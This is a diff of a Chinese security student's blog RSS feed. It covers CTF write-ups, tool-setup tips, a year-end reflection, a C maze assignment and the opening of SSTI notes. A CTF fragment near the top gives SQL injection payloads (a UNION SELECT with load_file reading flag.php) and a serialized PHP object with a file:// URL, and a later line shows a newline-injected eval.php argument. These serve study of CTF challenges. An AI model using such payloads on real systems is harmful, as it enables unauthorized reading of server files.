+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>O:8:&amp;quot;UserInfo&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;amiz&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;}
+&lt;/code>&lt;/pre>&lt;p>但是本身这玩意还得有个注入点，它在url最后的&lt;code>no&lt;/code>参数处&lt;/p>
+&lt;pre tabindex="0">&lt;code>/view.php?no=1 order by 4%23 # 5报错 共4列
+&lt;/code>&lt;/pre>&lt;p>不反序列化也行，它没过滤&lt;code>load_file&lt;/code>直接就读文件了&lt;/p>
+&lt;pre tabindex="0">&lt;code>/view.php?no=-1 union/**/select/**/1,load_file(&amp;quot;/var/www/html/flag.php&amp;quot;),3,4%23
+&lt;/code>&lt;/pre>&lt;p>有点奇怪的，你说它过滤空格，但是前面那个不用注释也可以，而且前面参数是1还不行&lt;/p>
+&lt;/details></description></item><item><title>无题</title><link>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</link><pubDate>Thu, 13 Jan 2022 10:58:56 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</guid><description>&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+本地搭建Visual Regexp
+&lt;/h4>
+&lt;/summary>
+&lt;p>搭建原因大家应该都懂吧，一个是正则可视化实在是很香很必要，其次线下没网的话没有个离线工具就很容易gg，同类工具还有&lt;a href="https://github.com/gchq/CyberChef/releases/tag/v9.32.3">cyberchef&lt;/a>等&lt;/p>
+&lt;p>&lt;a href="https://wangwl.net/static/projects/visualRegex/#">Visual Regexp在线地址&lt;/a> | &lt;a href="https://github.com/relax-code-relax-life/visualRegexPage">github仓库&lt;/a>&lt;/p>
+&lt;p>在&lt;code>git clone&lt;/code>之后首先肯定是&lt;code>npm install&lt;/code>，出现vulnerabilities很正常，直接&lt;code>npm audit fix --force&lt;/code>，一次不行就两次&lt;/p>
+&lt;p>奇葩的是作者自己的visual-regex包一直是以快捷方式的形式被安装（后来发现是整个项目的package.json编写的问题）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182010887.png" alt="image-20211114182010887">&lt;/p>
+&lt;p>解决方法：删除快捷方式，单独安装&lt;code>npm i visual-regex&lt;/code>，用everything查找到该包具体存在的位置，复制到node_modules目录下&lt;/p>
+&lt;p>之后到build目录下&lt;code>node .\build.js&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182307150.png" alt="image-20211114182307150">&lt;/p>
+&lt;p>报错hightlight.js并没有引入./lib/highlight，查看\highlight.js\package.json的exports部分，发现第90行的引用是&amp;quot;.&amp;quot;，将其改为&amp;quot;./lib/highlight&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/JQW8B657%60%241JG%5BFOWY1I%7BBW.png" alt="img">&lt;/p>
+&lt;p>再次build提示*&amp;lsquo;NODE_ENV&amp;rsquo; is not recognized as an internal or external command, operable program or batch file.*（此处截图走丢了），解决方法&lt;code>npm install -g win-node-env&lt;/code>&lt;/p>
+&lt;p>之后&lt;code>node .\build.js&lt;/code>即可成功build，在devlist文件夹下的index.html即可正常使用相关功能&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+无法打开jar包应用
+&lt;/h4>
+&lt;/summary>
+&lt;p>这个应该属于常见问题了，一般原因是java版本不对&lt;/p>
+&lt;p>很多人选择设置不同名字的环境变量，比如java8，java11，我的话是只有java11是环境变量，在有些jar需要java8的环境时直接用everything搜索java.exe，复制路径之后&lt;code>xxx\java.exe -jar xyz.jar&lt;/code>这样来运行&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117132839594.png" alt="image-20211117132839594">&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+远程调试Node.js
+&lt;/h4>
+&lt;/summary>
+&lt;p>场景：用vulhub或其它已经打包好的docker环境复现cve需要远程调试&lt;/p>
+&lt;p>首先修改对应的docker文件：package.json的&amp;quot;scripts&amp;quot;字段的&amp;quot;start&amp;quot;部分增加&lt;code>--inspect=0.0.0.0:port&lt;/code>，指名调试时的监听端口&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117160017724.png" alt="image-20211117160017724">&lt;/p>
+&lt;p>docker-compose.yml中增加监听端口&amp;quot;8000:9229&amp;quot;，之后正常&lt;code>docker-compose up -d&lt;/code>&lt;/p>
+&lt;p>本地先下载好一样的文件，用vscode生成一个调试文档lauch.json&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117155743006.png" alt="image-20211117155743006">&lt;/p>
+&lt;p>需要改的配置有address（远程ip），port（远程监听端口），localRoot（本地路径），remote（远程路径），之后即可打断点调试&lt;/p>
+&lt;p>出现unbound breakpoint正常，大概率是你的交互就没执行到打断点的地方，所以没什么反应&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+VirtualBox给虚拟机磁盘扩容
+&lt;/h4>
+&lt;/summary>
+&lt;p>当初给kali只分配了16G（无奈啊，谁让我主机也就512，得省着用），导致今天pip一个包都失败&lt;/p>
+&lt;p>之后我直接用自带的主机介质管理器增加盘片的大小&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113110156096.png" alt="image-20220113110156096">&lt;/p>
+&lt;p>当我把下面显示大小的条滑到24G的时候我觉得稳了，这还能不够用？？？于是自信开机&lt;/p>
+&lt;p>笑死，GParted没识别出来，&lt;code>df -h&lt;/code>也完全没变化，我就又多分配了4G，结果裂开，还是没识别&lt;/p>
+&lt;p>然后我发现问题在于快照的存储是单独有一个uuid的vdi的，而扩容时我选择在最上层的kali.vdi扩容，导致不会同步到下面的快照的存储信息&lt;/p>
+&lt;p>解决方法就是把前面所有的快照删除掉，之后再开机就可以识别了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113112010762.png" alt="image-20220113112010762">&lt;/p>
+&lt;p>由于未分配和/dev/sda1之间隔着扩展分区和swap，所以先删除这两个，扩容后再新建加回来&lt;/p>
+&lt;p>应用修改之后自信开机，发现怎么kali的龙半天都不蓝…… 一番排错，之后发现是因为swap分区的uuid发生改变导致swap没有正常挂载（&lt;code>swapon --show&lt;/code>回显为空）&lt;/p>
+&lt;p>输入&lt;code>blkid&lt;/code>复制/dev/sda5的uuid，将其复制粘贴到/etc/fstab的对应位置，就好啦&lt;/p>
+&lt;/details></description></item><item><title>2021小结</title><link>https://amiaaaz.github.io/2022/01/02/2021-short-summary/</link><pubDate>Sun, 02 Jan 2022 20:08:38 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/02/2021-short-summary/</guid><description>&lt;p>写点什么呢？现在是2022年1月2日23点08分，本来应该在疯狂的肝数据结构的期末复习，但是我还是决定把本来计划在回家的飞机上写的年末总结写掉，了一桩心事。&lt;/p>
 &lt;p>2021，对我而言是有挑战的一年。四月初正式开始学安全，断断续续的自己瞎琢磨，7月底加入V&amp;amp;N（见到了很多很多巨nb的师傅），暑假因为一些懂得都懂的原因摆了，开学之后的9月参加了一次hvv，10月参加强网杯青少赛拿了一等奖（感谢两位同队师傅带我）&lt;/p>
 &lt;p>但是之后呢？我回顾了一下10月和之后的学习过程，发自内心的说我并不满意。说做了多少题吗？也没有，说学扎实了哪些知识点吗？也没有。那是玩什么游戏、享受生活了吗？也没有。奇怪的是博客一直都在发，wp也一直在写，那写的都是什么呢？随便提一些基本的技术细节还是做不到条理清晰地表达出来，打ctf还是一副相当拉垮的样子。&lt;/p>
 &lt;p>过于丧气的话就不多说了，2021年还是收获颇丰的一年，开心的是学到了很多很多好玩有趣的web安全方面的技术，其次庆幸的是我自认为找到了上述困扰我的问题的一些原因。有时候我总是过于看重一段时间的学习成果而忽视了学习是一个长期积累的过程，学习不应该是某种“快消品”，而是一个长期乃至终身的事业，不应该把眼光局限于某一个阶段而把自己困进去。&lt;/p>
 &lt;p>很多时候自己也会陷入无意义的内耗和自我纠结中，之后看到这句话：&lt;u>知之愈明，则行之愈笃；行之愈笃，则知之益明。&lt;/u> 也就有点明白过来了。&lt;/p>
 &lt;p>2022年希望能多打比赛，进线下，学更多更多更多的知识，在北京找一份实习工作（小目标），也希望能保持平稳的心态，多看书，每天留给自己思考放空的时间，不要被高速的生活所裹挟；希望每一天都过的充实丰富。&lt;/p>
-&lt;p>好困好困，不多bb，4号到12号要考6门，希望我能活着回家。&lt;/p></description></item><item><title>数据结构作业——链栈&amp;迷宫求解</title><link>https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/</link><pubDate>Thu, 30 Dec 2021 13:09:58 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
+&lt;p>好困好困，不多bb，4号到12号要考6门，希望我能活着回家。&lt;/p>
+&lt;p>————想到了就补充一点：一般的年度总结都要给2022定学习计划，但是这里就不写了（主要是太菜了写出来丢人，溜了溜了）&lt;/p></description></item><item><title>数据结构作业——链栈&amp;迷宫求解</title><link>https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/</link><pubDate>Thu, 30 Dec 2021 13:09:58 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/30/linkstack-in-maze-question/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdbool.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
@@ -4587,50 +5503,7 @@ https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>3d5dd579-0678ef93-18b70cae-cabc5d51&lt;/code>&lt;/p>
 &lt;hr>
 &lt;p>难度应该算是偏简单的，就是，emmmmmmmmmm&lt;/p>
-&lt;p>算了，我不好说&lt;/p></description></item><item><title>无题</title><link>https://amiaaaz.github.io/2021/11/14/maybe-help-someone/</link><pubDate>Sun, 14 Nov 2021 18:10:01 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/maybe-help-someone/</guid><description>&lt;details>
-&lt;summary>
-&lt;h4 class="inline">
-本地搭建Visual Regexp
-&lt;/h4>
-&lt;/summary>
-&lt;p>搭建原因大家应该都懂吧，一个是正则可视化实在是很香很必要，其次线下没网的话没有个离线工具就很容易gg，同类工具还有&lt;a href="https://github.com/gchq/CyberChef/releases/tag/v9.32.3">cyberchef&lt;/a>等&lt;/p>
-&lt;p>&lt;a href="https://wangwl.net/static/projects/visualRegex/#">Visual Regexp在线地址&lt;/a> | &lt;a href="https://github.com/relax-code-relax-life/visualRegexPage">github仓库&lt;/a>&lt;/p>
-&lt;p>在&lt;code>git clone&lt;/code>之后首先肯定是&lt;code>npm install&lt;/code>，出现vulnerabilities很正常，直接&lt;code>npm audit fix --force&lt;/code>，一次不行就两次&lt;/p>
-&lt;p>奇葩的是作者自己的visual-regex包一直是以快捷方式的形式被安装（后来发现是整个项目的package.json编写的问题）&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182010887.png" alt="image-20211114182010887">&lt;/p>
-&lt;p>解决方法：删除快捷方式，单独安装&lt;code>npm i visual-regex&lt;/code>，用everything查找到该包具体存在的位置，复制到node_modules目录下&lt;/p>
-&lt;p>之后到build目录下&lt;code>node .\build.js&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182307150.png" alt="image-20211114182307150">&lt;/p>
-&lt;p>报错hightlight.js并没有引入./lib/highlight，查看\highlight.js\package.json的exports部分，发现第90行的引用是&amp;quot;.&amp;quot;，将其改为&amp;quot;./lib/highlight&amp;quot;&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/JQW8B657%60%241JG%5BFOWY1I%7BBW.png" alt="img">&lt;/p>
-&lt;p>再次build提示*&amp;lsquo;NODE_ENV&amp;rsquo; is not recognized as an internal or external command, operable program or batch file.*（此处截图走丢了），解决方法&lt;code>npm install -g win-node-env&lt;/code>&lt;/p>
-&lt;p>之后&lt;code>node .\build.js&lt;/code>即可成功build，在devlist文件夹下的index.html即可正常使用相关功能&lt;/p>
-&lt;/details>
-&lt;details>
-&lt;summary>
-&lt;h4 class="inline">
-无法打开jar包应用
-&lt;/h4>
-&lt;/summary>
-&lt;p>这个应该属于常见问题了，一般原因是java版本不对&lt;/p>
-&lt;p>很多人选择设置不同名字的环境变量，比如java8，java11，我的话是只有java11是环境变量，在有些jar需要java8的环境时直接用everything搜索java.exe，复制路径之后&lt;code>xxx\java.exe -jar xyz.jar&lt;/code>这样来运行&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117132839594.png" alt="image-20211117132839594">&lt;/p>
-&lt;/details>
-&lt;details>
-&lt;summary>
-&lt;h4 class="inline">
-远程调试Node.js
-&lt;/h4>
-&lt;/summary>
-&lt;p>场景：用vulhub或其它已经打包好的docker环境复现cve需要远程调试&lt;/p>
-&lt;p>首先修改对应的docker文件：package.json的&amp;quot;scripts&amp;quot;字段的&amp;quot;start&amp;quot;部分增加&lt;code>--inspect=0.0.0.0:port&lt;/code>，指名调试时的监听端口&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117160017724.png" alt="image-20211117160017724">&lt;/p>
-&lt;p>docker-compose.yml中增加监听端口&amp;quot;8000:9229&amp;quot;，之后正常&lt;code>docker-compose up -d&lt;/code>&lt;/p>
-&lt;p>本地先下载好一样的文件，用vscode生成一个调试文档lauch.json&lt;/p>
-&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117155743006.png" alt="image-20211117155743006">&lt;/p>
-&lt;p>需要改的配置有address（远程ip），port（远程监听端口），localRoot（本地路径），remote（远程路径），之后即可打断点调试&lt;/p>
-&lt;p>出现unbound breakpoint正常，大概率是你的交互就没执行到打断点的地方，所以没什么反应&lt;/p>
-&lt;/details></description></item><item><title>SSTI学习笔记</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式&lt;/p>
+&lt;p>算了，我不好说&lt;/p></description></item><item><title>SSTI学习笔记</title><link>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</link><pubDate>Mon, 08 Nov 2021 20:59:28 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/08/ssti-study-notes/</guid><description>&lt;p>模板渲染可以借助代码构造（如条件、循环语句等）十分方便的动态呈现内容，但如果编写不当容易被攻击者注入恶意内容从而暴露上下文数据，甚至在服务器上运行执行任意命令的表达式&lt;/p>
 &lt;h1 id="jinja">Jinja&lt;/h1>
 &lt;p>Jinja2是一种面向Python的现代和设计友好的模板语言，以Django的模板为模型，是Flask框架的一部分&lt;/p>
 &lt;p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用&lt;u>过滤器&lt;/u>修改变量，过滤器名添加在变量名之后，中间使用竖线分隔（这很有利于我们构造恶意的payload），比如这样的模板可以用首字母大写形式显示变量name的值&lt;/p>
